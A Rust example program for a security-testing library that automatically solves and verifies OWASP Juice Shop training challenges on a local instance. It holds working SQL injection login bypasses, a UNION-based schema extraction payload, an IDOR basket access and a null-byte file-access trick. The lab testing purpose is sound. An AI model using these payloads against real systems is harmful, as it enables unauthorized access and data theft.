//! Verified Juice Shop Scenarios
//!
//! Demonstrates implementing ChallengeVerifier for OWASP Juice Shop.
//!
//! Run with: cargo run --example juice_shop_verified

use async_trait::async_trait;
use rectitude::ctf::{ChallengeProgress, ChallengeVerifier};
use rectitude::prelude::*;
use rectitude::reporter::ReportBuilder;
use std::collections::HashMap;
use std::sync::Arc;

const BASE_URL: &str = "http://localhost:3000";

// ============ Juice Shop Verifier (example implementation) ============

/// OWASP Juice Shop verifier - implements ChallengeVerifier trait
#[derive(Debug, Clone)]
struct JuiceShopVerifier {
    base_url: String,
    client: reqwest::Client,
}

impl JuiceShopVerifier {
    fn new(base_url: &str) -> Self {
        Self {
            base_url: base_url.trim_end_matches('/').to_string(),
            client: reqwest::Client::new(),
        }
    }

    async fn fetch_challenges(&self) -> Result<serde_json::Value> {
        let url = format!("{}/api/Challenges", self.base_url);
        let resp = self
            .client
            .get(&url)
            .send()
            .await
            .map_err(|e| Error::Other(format!("Failed to fetch challenges: {}", e)))?;

        if !resp.status().is_success() {
            return Err(Error::Other(format!(
                "Challenges API returned status {}",
                resp.status()
            )));
        }

        resp.json()
            .await
            .map_err(|e| Error::Other(format!("Failed to parse challenges JSON: {}", e)))
    }
}

#[async_trait]
impl ChallengeVerifier for JuiceShopVerifier {
    async fn is_solved(&self, challenge_key: &str) -> Result<bool> {
        let json = self.fetch_challenges().await?;

        let solved = json
            .get("data")
            .and_then(|d| d.as_array())
            .and_then(|arr| {
                arr.iter()
                    .find(|c| c.get("key").and_then(|k| k.as_str()) == Some(challenge_key))
            })
            .and_then(|c| c.get("solved"))
            .and_then(|s| s.as_bool())
            .unwrap_or(false);

        Ok(solved)
    }

    async fn get_progress(&self) -> Result<ChallengeProgress> {
        let json = self.fetch_challenges().await?;

        let data = json
            .get("data")
            .and_then(|d| d.as_array())
            .ok_or_else(|| Error::Other("Invalid challenges response format".to_string()))?;

        let mut challenges = HashMap::new();
        let mut solved = 0;

        for challenge in data {
            if let Some(key) = challenge.get("key").and_then(|k| k.as_str()) {
                let is_solved = challenge
                    .get("solved")
                    .and_then(|s| s.as_bool())
                    .unwrap_or(false);

                challenges.insert(key.to_string(), is_solved);
                if is_solved {
                    solved += 1;
                }
            }
        }

        Ok(ChallengeProgress::new(solved, data.len(), challenges))
    }
}

// ============ Main ============

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    tracing_subscriber::fmt().with_env_filter("info").init();

    println!("=== Verified Juice Shop Scenario Tests ===\n");

    let verifier = JuiceShopVerifier::new(BASE_URL);

    // Get initial progress
    let initial = verifier.get_progress().await?;
    println!(
        "Initial progress: {}/{} ({:.1}%)\n",
        initial.solved, initial.total, initial.percentage
    );

    let mut report = ReportBuilder::new();

    // Run verified scenarios
    report = report
        .add_result(score_board_verified(&verifier).await?)
        .add_result(error_handling_verified(&verifier).await?)
        .add_result(login_admin_verified(&verifier).await?)
        .add_result(admin_section_verified(&verifier).await?)
        .add_result(view_basket_verified(&verifier).await?)
        .add_result(login_jim_verified(&verifier).await?)
        .add_result(database_schema_verified(&verifier).await?)
        .add_result(poison_null_byte_verified(&verifier).await?)
        .add_result(zero_stars_verified(&verifier).await?);

    let test_report = report.build();
    test_report.print_summary();

    // Check for newly solved challenges
    let newly_solved = verifier.compare_progress(&initial).await?;
    println!("\n=== Progress Summary ===");
    let final_progress = verifier.get_progress().await?;
    println!(
        "Final progress: {}/{} ({:.1}%)",
        final_progress.solved, final_progress.total, final_progress.percentage
    );

    if !newly_solved.is_empty() {
        println!("\nNewly solved challenges:");
        for key in &newly_solved {
            println!("  + {}", key);
        }
    } else {
        println!("\nNo new challenges solved (all were already complete)");
    }

    Ok(())
}

// ============ Helper ============

fn verify_step(
    verifier: &JuiceShopVerifier,
    challenge_key: &'static str,
    challenge_name: &'static str,
) -> impl Fn(
    Arc<ScenarioContext>,
) -> std::pin::Pin<Box<dyn std::future::Future<Output = Result<StepResult>> + Send>>
+ Send
+ Sync
+ 'static {
    let verifier = verifier.clone();
    move |_ctx| {
        let verifier = verifier.clone();
        Box::pin(async move {
            if verifier.is_solved(challenge_key).await? {
                Ok(StepResult::success_with_message(format!(
                    "{} - VERIFIED",
                    challenge_name
                )))
            } else {
                Ok(StepResult::failed(format!(
                    "{} - NOT SOLVED",
                    challenge_name
                )))
            }
        })
    }
}

// ============ Scenarios ============

async fn score_board_verified(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Score Board")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "verified"])
        .step(
            "Access score board",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/#/score-board").send().await?;
                resp.expect_success()?;
                ok_with("Score board accessed")
            },
        )
        .step(
            "Verify",
            verify_step(verifier, "scoreBoardChallenge", "Score Board"),
        )
        .run()
        .await
}

async fn error_handling_verified(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Error Handling")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "verified"])
        .step("Trigger error", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .get("/rest/products/search")
                .query("q", "';")
                .send()
                .await?;
            if resp.status.as_u16() == 500 || resp.contains("error") {
                ok_with("Error exposed")
            } else {
                fail("No error")
            }
        })
        .step(
            "Verify",
            verify_step(verifier, "errorHandlingChallenge", "Error Handling"),
        )
        .run()
        .await
}

async fn login_admin_verified(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Login Admin SQLi")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "sqli", "verified"])
        .step("SQLi login", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "' OR 1=1--",
                    "password": "x"
                }))
                .send()
                .await?;
            if resp.is_success() {
                ctx.store("token", &resp, "$.authentication.token").await?;
                ok_with("Admin login successful")
            } else {
                fail("SQLi failed")
            }
        })
        .step(
            "Verify",
            verify_step(verifier, "loginAdminChallenge", "Login Admin"),
        )
        .run()
        .await
}

async fn admin_section_verified(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Admin Section")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "verified"])
        .step("Login as admin", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "admin@juice-sh.op'--",
                    "password": "x"
                }))
                .send()
                .await?;
            ctx.store("token", &resp, "$.authentication.token").await?;
            ok()
        })
        .step(
            "Access admin page",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/#/administration").send().await?;
                resp.expect_success()?;
                ok_with("Admin section accessed")
            },
        )
        .step(
            "Verify",
            verify_step(verifier, "adminSectionChallenge", "Admin Section"),
        )
        .run()
        .await
}

async fn view_basket_verified(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("View Basket IDOR")
        .base_url(BASE_URL)
        .tags(&["difficulty-2", "idor", "verified"])
        .step("Login", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "admin@juice-sh.op'--",
                    "password": "x"
                }))
                .send()
                .await?;
            ctx.store("token", &resp, "$.authentication.token").await?;
            ok()
        })
        .step(
            "Access other basket",
            |ctx: Arc<ScenarioContext>| async move {
                let token = ctx.get_var_async("token").await?;
                let resp = ctx.get("/rest/basket/2").bearer_auth(&token).send().await?;
                if resp.is_success() {
                    ok_with("Accessed basket 2")
                } else {
                    fail("IDOR failed")
                }
            },
        )
        .step(
            "Verify",
            verify_step(verifier, "basketAccessChallenge", "View Basket"),
        )
        .run()
        .await
}

async fn login_jim_verified(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Login Jim SQLi")
        .base_url(BASE_URL)
        .tags(&["difficulty-3", "sqli", "verified"])
        .step("SQLi as Jim", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx
                .post("/rest/user/login")
                .json(&serde_json::json!({
                    "email": "jim@juice-sh.op'--",
                    "password": "x"
                }))
                .send()
                .await?;
            if resp.is_success() {
                ok_with("Logged in as Jim")
            } else {
                fail("SQLi failed")
            }
        })
        .step(
            "Verify",
            verify_step(verifier, "loginJimChallenge", "Login Jim"),
        )
        .run()
        .await
}

async fn database_schema_verified(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Database Schema SQLi")
        .base_url(BASE_URL)
        .tags(&["difficulty-3", "sqli", "verified"])
        .step("Extract schema", |ctx: Arc<ScenarioContext>| async move {
            let payload = "')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--";
            let resp = ctx
                .get("/rest/products/search")
                .query("q", payload)
                .send()
                .await?;
            if resp.contains("CREATE TABLE") {
                ok_with("Schema extracted")
            } else {
                fail("Extraction failed")
            }
        })
        .step(
            "Verify",
            verify_step(verifier, "dbSchemaChallenge", "Database Schema"),
        )
        .run()
        .await
}

async fn poison_null_byte_verified(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Poison Null Byte")
        .base_url(BASE_URL)
        .tags(&["difficulty-4", "verified"])
        .step(
            "Access with null byte",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/ftp/package.json.bak%2500.md").send().await?;
                if resp.is_success() && resp.contains("dependencies") {
                    ok_with("Backup accessed")
                } else {
                    fail("Null byte failed")
                }
            },
        )
        .step(
            "Verify",
            verify_step(verifier, "forgottenDevBackupChallenge", "Forgotten Backup"),
        )
        .run()
        .await
}

async fn zero_stars_verified(verifier: &JuiceShopVerifier) -> Result<ScenarioResult> {
    Scenario::new("Zero Stars Feedback")
        .base_url(BASE_URL)
        .tags(&["difficulty-1", "verified"])
        .step("Get captcha", |ctx: Arc<ScenarioContext>| async move {
            let resp = ctx.get("/rest/captcha").send().await?;
            let captcha = resp.json_value()?;
            let captcha_id = captcha
                .get("captchaId")
                .and_then(|v| v.as_i64())
                .unwrap_or(0);
            let answer = captcha.get("answer").and_then(|v| v.as_str()).unwrap_or("");
            ctx.set_var_async("captcha_id", captcha_id.to_string())
                .await;
            ctx.set_var_async("captcha_answer", answer).await;
            ok()
        })
        .step(
            "Submit 0-star feedback",
            |ctx: Arc<ScenarioContext>| async move {
                let captcha_id: i64 = ctx.get_var_async("captcha_id").await?.parse().unwrap_or(0);
                let answer = ctx.get_var_async("captcha_answer").await?;

                let resp = ctx
                    .post("/api/Feedbacks")
                    .json(&serde_json::json!({
                        "comment": "Zero stars test",
                        "rating": 0,
                        "captchaId": captcha_id,
                        "captcha": answer
                    }))
                    .send()
                    .await?;

                if resp.is_success() {
                    ok_with("Zero-star feedback submitted")
                } else {
                    fail("Feedback rejected")
                }
            },
        )
        .step(
            "Verify",
            verify_step(verifier, "zeroStarsChallenge", "Zero Stars"),
        )
        .run()
        .await
}
